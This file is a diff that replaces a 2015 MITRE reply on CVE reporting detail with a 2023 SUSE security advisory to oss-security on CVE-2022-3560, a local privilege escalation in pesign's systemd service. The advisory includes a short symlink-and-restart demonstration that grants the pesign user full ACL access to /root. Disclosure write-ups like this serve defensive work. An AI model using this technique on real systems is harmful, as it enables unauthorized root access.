@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2161" "Tuesday" "14" "April" "2015" "03:20:59" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20150414072059.ECDD033205D@smtpvbsrv1.mitre.org>" "50" "[oss-security] Re: discourage \"CVE only\" use of (linux-)distros" nil nil nil "4" "2015041407:20:59" "[oss-security] Re: discourage \"CVE only\" use of (linux-)distros" (number mark "        cve-assign@m Apr 14   50/2161  " thread-indent "\"[oss-security] Re: discourage \"CVE only\" use of (linux-)distros\"\n") "<20150413144114.GA29241@openwall.com>" ("<20150413144114.GA29241@openwall.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0001
-X-Mozilla-Status2: 00000000
-Received: (qmail 17506 invoked by uid 550); 14 Apr 2015 07:21:20 -0000
+Received: (qmail 15960 invoked by uid 550); 1 Feb 2023 10:06:01 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,63 +6,146 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 16355 invoked from network); 14 Apr 2015 07:21:11 -0000
-In-Reply-To: <20150413144114.GA29241@openwall.com>
-Message-Id: <20150414072059.ECDD033205D@smtpvbsrv1.mitre.org>
-Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
-Date: Tue, 14 Apr 2015 03:20:59 -0400 (EDT)
-From: cve-assign@mitre.org
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Re: discourage "CVE only" use of (linux-)distros
-To: solar@openwall.com
+Received: (qmail 15936 invoked from network); 1 Feb 2023 10:06:01 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
+	t=1675245949; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
+	 mime-version:mime-version:content-type:content-type:
+	 in-reply-to:in-reply-to:references:references;
+	bh=nt83o2nNsJQFqIAcqO4cXEp6UsxBPIS9yFyvgO024cM=;
+	b=s7gHIiWmgtQYexROpbFVhdpnJYcouYTvTSCvSYuJFqHS+fimXalycOLinoXAICeRKYan+y
+	FodsxhJIZaC2/bInCdxAqXKQ6ZQRUKuFp9dUKkACKUaImMnHyWwk2DlUvtkeObwT3o/A9Z
+	BF7GNvSf+dAqFBmh80abKH/TcAq6uCA=
+DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
+	s=susede2_ed25519; t=1675245949;
+	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
+	 mime-version:mime-version:content-type:content-type:
+	 in-reply-to:in-reply-to:references:references;
+	bh=nt83o2nNsJQFqIAcqO4cXEp6UsxBPIS9yFyvgO024cM=;
+	b=MtaKW0RTu5EhfHs9+AcQmO5G852kHNCIiAywg6Opar3oxLRCip0cFi4QrCXP2Gr5XwWkTS
+	QTlNMfLjMecRMgCQ==
+Date: Wed, 1 Feb 2023 11:05:49 +0100
+From: Matthias Gerstner <mgerstner@suse.de>
+To: oss-security@lists.openwall.com
+Message-ID: <Y9o5fXKqZDxOHbNe@kasco.suse.de>
+References: <CAOGQQ29pYOHP2puP-nAzO+Qnbc-OouwnVFpQVY_=OvVo12=Mkw@mail.gmail.com>
+MIME-Version: 1.0
+Content-Type: multipart/signed; micalg=pgp-sha256;
+	protocol="application/pgp-signature"; boundary="mMZSM2ohlcv93G8R"
+Content-Disposition: inline
+In-Reply-To: <CAOGQQ29pYOHP2puP-nAzO+Qnbc-OouwnVFpQVY_=OvVo12=Mkw@mail.gmail.com>
+Subject: Re: [oss-security] pesign: Local privilege escalation on pesign
+ systemd service
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+--mMZSM2ohlcv93G8R
+Content-Type: text/plain; protected-headers=v1; charset=iso-8859-1
+Content-Disposition: inline
+Content-Transfer-Encoding: quoted-printable
+Date: Wed, 1 Feb 2023 11:05:49 +0100
+From: Matthias Gerstner <mgerstner@suse.de>
+To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] pesign: Local privilege escalation on pesign
+ systemd service
 
-> if MITRE can assign them without obtaining detail
+Hi,
 
-If the person is already very familiar with what types of issues
-are included in CVE, and what requests should go to MITRE
-rather than to the vendor, then we are usually most concerned
-with counting vulnerabilities. In other words, minimum
-information for a report about one open-source product could be:
+On Tue, Jan 31, 2023 at 12:59:19PM -0300, Marco Benatto wrote:
+> a local privilege escalation vulnerability was found in pesign. This
+> vulnerability has been identified by CVE-2022-3560.
 
- - is part of the report about a vulnerability affecting one
-   version, and another part of the report about a vulnerability
-   affecting a different version?
+I would like to add some more details about the vulnerability:
 
- - is part of the report about a vulnerability that became public
-   at one point in time, and another part of the report about a
-   vulnerability that became public at a different point in time,
-   such that customers may realistically have an installation that
-   already has a fix for only the first part?
+The project ships a systemd service file that starts a pesign daemon
+instance but also runs a StartPost script:
 
- - is part of the report about a vulnerability discovered by one
-   person/organization, and another part of the report about a
-   vulnerability discovered by a different person/organization?
+```
+ExecStart=3D/usr/bin/pesign --daemonize
+ExecStartPost=3D/usr/libexec/pesign/pesign-authorize
+```
 
- - is there any reasonable interpretation that part of the report
-   is about one "vulnerability type" and another part of the report
-   is about a different "vulnerability type"? (We know that there
-   is no possible definition of "vulnerability type" that makes
-   sense for every conceivable security-research effort that may be
-   occurring now or in the future.)
+This pesign-authorize script is run with root privileges and grants a
+dynamic list of users and groups recursively full access to
+/etc/pki/pesign*/ and /run/pesign via POSIX access control lists.
 
-"already very familiar" isn't the common case, though.
+The list of users is found in the root controlled files
+/etc/pesign/users and /etc/pesign/groups. By default only pesign:pesign
+are configured.
 
-- -- 
-CVE assignment team, MITRE CVE Numbering Authority
-M/S M300
-202 Burlington Road, Bedford, MA 01730 USA
-[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
+# The Vulnerability
+
+Since the pesign-authorize script is run at every start of the pesign
+service unit, the directory trees /etc/pki/pesign* and /run/pesign will
+already be controlled by the unprivileged pesign:pesign user and group.
+The script does not take precautions to prevent symlink attacks being
+staged by a compromised unprivileged user account.
+
+A simple demonstration of the attack would be this:
+
+```
+root# sudo -u pesign -g pesign ln -s /root /etc/pki/pesign/attack
+root# systemctl restart pesign
+root# getfactl /root
+# file: root/
+# owner: root
+# group: root
+user::rwx
+user:pesign:rwx
+group::---
+group:pesign:rwx
+mask::rwx
+other::---
+```
+
+Therefore in a default configuration of pesign there is a local pesign
+user or pesign group to root escalation that can be achieved at every
+pesign.service unit start.
+
+I reproduced this on Fedora 35 using pesign version 113 release 18.fc35.
+
+# Timeline
+
+- 2022-10-11: I reported this to secalert@redhat.com  offering
+  coordinated disclosure.
+- 2022-10-18: RedHat security assigned the CVE for the issue
+- 2022-12-21: RedHat security communicated a coordinated release date
+  for 2023-01-31.
+- 2023-01-27: RedHat security shared the patch with us and informed the
+  distros mailing list about issue and the upcoming release
+- 2023-01-31: the issue has been published
+
+Cheers
+
+Matthias
+
+--=20
+Matthias Gerstner <matthias.gerstner@suse.de>
+Security Engineer
+https://www.suse.com/security
+GPG Key ID: 0x14C405C971923553
+=20
+SUSE Software Solutions Germany GmbH
+HRB 36809, AG N=FCrnberg
+Gesch=E4ftsf=FChrer: Ivo Totev, Andrew Myers, Andrew McDonald, Boudien Moer=
+man
+
+--mMZSM2ohlcv93G8R
+Content-Type: application/pgp-signature; name="signature.asc"
+
 -----BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.14 (SunOS)
 
-iQEcBAEBAgAGBQJVLL9UAAoJEKllVAevmvmssGMH/iWs83qn0iLz8nV4UgsAiAhG
-LwflwpEO26x5bFKkSECcfi55JPZKnN4z/4+wfFakENesLeNTEu9blb6rEJcl6KbG
-o/R7TUE+uA/w8VXN91U8v5E04EQXgGuSaAFs+Zn8OwpSE2NHlmxZAQVGBFR6klSi
-nSnTFDGj9fkh6BUsB6yE2j9QDtw2S/TTwGYnjnoEWDXCEMQCwpKJBwbv+031CiME
-09n6D7puQQ6vNv3ycYvvckUNIfEAU12hF+bxRf+6niQhpve551cccrOQZ/CdFYG8
-RxMRmP5B7P5494DyyuMBFPmxRMTfo815SY5AadWhp05Y21r+pMePGPMzeuDjUpA=
-=L6eh
+iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAmPaOX0ACgkQFMQFyXGS
+NVMbzw//bBnW9jGu/vJvcZ5s+uM3ntGQhV9pAzIs1LV5Wf1XKA7+worHR/myBA7m
++zwb0KCX0uHoaV7+o5qW1MF7ExHkOzldVwa3ugXBl05RdM9b6pgzjejl7iwC2GvP
++u06sqPu9QODJJRkrT3Fbjuffp8fFj+JcCGk64qe/I8DZnEol3uDHx8wGbUcGE/v
+eBT7h1Aq921aoTIDvqY0MjRErwZF20LVYzylKDf1Vk+Ru9J4OLWd6XAuOELAgFfL
+cjbP5EgQs/UD105Nyelstf2FHHBetYtkNltWGXfUOzmSVqkxsXe1mMz+qidLsSTJ
+HlLawM2R3essee/itbXzmmPkrrMpC3lpb7kpMidFRI36xYpI6NQg15kQlzD+wrJ2
+jrLVsn1bwKDxCl7hI+bbTM6segF8L0+JvwtYrvviZ0DQGkjilEG8YkZDD25BQUtW
+GJczQkluIHbJRbzDVNpUoqYZDHfLD8kjX49fR3qRAMMiTsASMuvKd2CGXDOStGBN
+qWkXiVcd1ALsMwGcwXAZ3ZRW6Z0+lW76ijO0enq+3jiqW56YD90y58xXixyYGknR
+JaSY+fymydOJ+ehrS4bTtsicRniZwJXE83hiaXRPy1r83Z8rcr1uBaPox/EJmBh5
+TV6asZtwqSlUytCnNU+bbx3TBC+G4NqssuOkefIZZfNcLrDfJi8=
+=Dmhv
 -----END PGP SIGNATURE-----
+
+--mMZSM2ohlcv93G8R--
